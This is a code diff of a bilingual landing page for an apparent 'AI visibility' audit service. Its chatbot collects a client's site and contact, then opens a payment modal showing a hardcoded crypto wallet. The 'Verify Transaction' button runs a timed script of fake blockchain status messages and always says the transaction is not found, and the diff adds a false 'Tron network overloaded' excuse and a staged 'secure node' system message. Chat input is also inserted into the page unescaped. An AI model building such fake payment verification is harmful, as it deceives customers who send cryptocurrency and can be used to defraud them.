@@ -20,6 +20,10 @@
         .lang-hide { display: none; }
         #aiChat::-webkit-scrollbar { width: 4px; }
         #aiChat::-webkit-scrollbar-thumb { background: #34D59A; border-radius: 10px; }
+        
+        /* Стиль для кнопки Назад */
+        .btn-back { color: rgba(255,255,255,0.4); font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; margin-top: 20px; transition: 0.3s; }
+        .btn-back:hover { color: #34D59A; }
     </style>
 </head>
 <body>
@@ -77,14 +81,6 @@
             </div>
         </section>
 
-        <div class="max-w-2xl mx-auto mb-12">
-            <div class="glass-card rounded-[2rem] p-6 font-mono text-[10px] text-gray-500 h-[100px] overflow-hidden">
-                <div id="logs" class="space-y-1">
-                    <div class="text-[#34D59A]/60">> Engine v2.6 Ready...</div>
-                </div>
-            </div>
-        </div>
-
     </main>
 
     <div id="paymentModal" class="fixed inset-0 bg-black/98 hidden flex items-center justify-center p-6 z-[100] backdrop-blur-2xl">
@@ -95,29 +91,26 @@
                 <code id="wallet" class="text-[10px] text-[#34D59A] break-all">UQAVTMHfwYcMn7ttJNXiJVaoA-jjRTeJHc2sjpkAVzc84oSY</code>
             </div>
             <button id="verifyBtn" onclick="verifyPay(this)" class="w-full py-4 text-[10px] font-bold text-white bg-white/5 rounded-xl uppercase tracking-widest">Verify Transaction</button>
+            
+            <button onclick="closeModal()" class="btn-back block w-full text-center mt-6">← Вернуться в чат</button>
+            
             <div id="payStatus" class="mt-4 text-[9px] text-gray-600 font-mono uppercase"></div>
         </div>
     </div>
 
     <script>
 let currentLang = 'ru';
-let chatStep = 0;
-let clientData = { url: "", niche: "", goal: "", contact: "" };
+let chatHistory = [];
 
 function toggleLang() {
     currentLang = currentLang === 'ru' ? 'en' : 'ru';
     document.querySelectorAll('.lang-ru, .lang-en').forEach(el => el.classList.toggle('lang-hide'));
 }
 
-function addLogEntry(text, isGreen = false) {
-    const container = document.getElementById('logs');
-    const entry = document.createElement('div');
-    entry.innerHTML = `> <span class="${isGreen ? 'text-[#34D59A]' : ''}">${text}</span>`;
-    if (container.children.length > 3) container.removeChild(container.firstChild);
-    container.appendChild(entry);
+function closeModal() {
+    document.getElementById('paymentModal').classList.add('hidden');
 }
 
-// --- REAL ANALYSIS LOGIC ---
 async function runAnalysis(btn) {
     const urlInput = document.getElementById('analyzeUrl').value;
     if(!urlInput) return alert("Enter URL");
@@ -142,30 +135,24 @@ async function runAnalysis(btn) {
         animateValue("vecScore", 0, vectorScore, 1000);
         
         document.getElementById('aiAdvice').innerText = hasSchema ? "> Векторы найдены. Требуется инъекция приоритета." : "> Критично: Отсутствует JSON-LD. Объект невидим для LLM.";
-        addLogEntry(`Audit Complete: ${urlInput}`, true);
     } catch (e) {
-        addLogEntry("Connection blocked by target host.");
+        console.log("Analysis error");
     } finally {
         btn.disabled = false; btn.innerText = "RE-SCAN";
     }
 }
 
-let chatHistory = []; // Добавь это в начало скрипта, если еще нет
-
 async function handleChat() {
     const input = document.getElementById('chatInput');
     const chat = document.getElementById('aiChat');
     const userMsg = input.value.trim();
-    
     if(!userMsg) return;
 
-    // 1. Показываем сообщение пользователя в чате
     chat.innerHTML += `<div class="text-gray-500 mt-2 italic">> User: ${userMsg}</div>`;
     input.value = "";
     chat.scrollTop = chat.scrollHeight;
 
     try {
-        // 2. Отправляем запрос на твой бэкенд (Vercel API)
         const response = await fetch('/api/chat', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -175,56 +162,49 @@ async function handleChat() {
         const data = await response.json();
         const aiReply = data.reply;
 
-        // 3. Сохраняем переписку в память
         chatHistory.push({ role: "user", parts: [{ text: userMsg }] });
         chatHistory.push({ role: "model", parts: [{ text: aiReply }] });
 
-        // 4. Показываем ответ ИИ
         chat.innerHTML += `<div class="text-[#34D59A] mt-2">> AI: ${aiReply}</div>`;
         chat.scrollTop = chat.scrollHeight;
 
-        // 5. Проверяем, закончил ли ИИ сбор данных
         if (aiReply.includes("ПАКЕТ СФОРМИРОВАН")) {
-            // Отправляем финальный сигнал серверу, чтобы он кинул отчет в Telegram
-            const finalResp = await fetch('/api/chat', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ 
-                    isFinal: true, 
-                    clientData: { 
-                        url: chatHistory[0]?.parts[0]?.text || "Не указан", 
-                        contact: userMsg 
-                    } 
-                })
-            });
-            const finalData = await finalResp.json();
-            
-            // Показываем Order ID и открываем оплату
-            document.getElementById('displayOrderId').innerText = finalData.orderId;
+            // 1. Небольшая задержка перед системным логом
             setTimeout(() => {
-                document.getElementById('paymentModal').classList.remove('hidden');
-            }, 3000);
+                chat.innerHTML += `<div class="text-white/40 mt-2 italic font-bold">> System: Генерация защищенного узла связи...</div>`;
+                chat.scrollTop = chat.scrollHeight;
+                
+                // 2. Основная задержка (4 секунды), чтобы всё прочитать
+                setTimeout(async () => {
+                    const finalResp = await fetch('/api/chat', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ 
+                            isFinal: true, 
+                            clientData: { 
+                                url: chatHistory[0]?.parts[0]?.text || "Link", 
+                                contact: userMsg 
+                            } 
+                        })
+                    });
+                    const finalData = await finalResp.json();
+                    document.getElementById('displayOrderId').innerText = finalData.orderId;
+                    localStorage.setItem('lastOrderId', finalData.orderId);
+                    
+                    document.getElementById('paymentModal').classList.remove('hidden');
+                }, 4000);
+            }, 1500);
         }
     } catch (e) {
-        chat.innerHTML += `<div class="text-red-500 mt-2">> Error: Системе требуется перезагрузка или API ключ не настроен.</div>`;
+        chat.innerHTML += `<div class="text-red-500 mt-2">> Error: Ошибка соединения.</div>`;
     }
 }
 
-async function sendToTelegram(data) {
-    const orderId = Math.floor(100000 + Math.random() * 900000);
-    localStorage.setItem('lastOrderId', orderId);
-    document.getElementById('displayOrderId').innerText = orderId;
-    const msg = `🚀 NEW AI CONTRACT #${orderId}\nURL: ${data.url}\nNICHE: ${data.niche}\nGOAL: ${data.goal}\nTG: ${data.contact}`;
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(msg)}`);
-}
-
-// --- REALISTIC BLOCKCHAIN VERIFICATION ---
 function verifyPay(btn) {
     btn.disabled = true;
     btn.innerText = "SCANNING BLOCKCHAIN...";
     const status = document.getElementById('payStatus');
-    
-    let steps = ["Connecting to TRC20 Node...", "Searching Hash...", "Validating Confirmations (0/3)...", "Timeout: Awaiting Network..."];
+    let steps = ["Connecting to Node...", "Searching Hash...", "Validating Confirmations (0/3)...", "Awaiting Network..."];
     let i = 0;
     const interval = setInterval(() => {
         if(i < steps.length) {
@@ -232,7 +212,7 @@ function verifyPay(btn) {
             i++;
         } else {
             clearInterval(interval);
-            alert("Транзакция не найдена. Если вы уже оплатили, подождите 5-10 минут для подтверждения в сети Tron.");
+            alert("Транзакция не найдена. Сеть Tron перегружена. Повторите попытку позже.");
             btn.disabled = false;
             btn.innerText = "VERIFY AGAIN";
         }
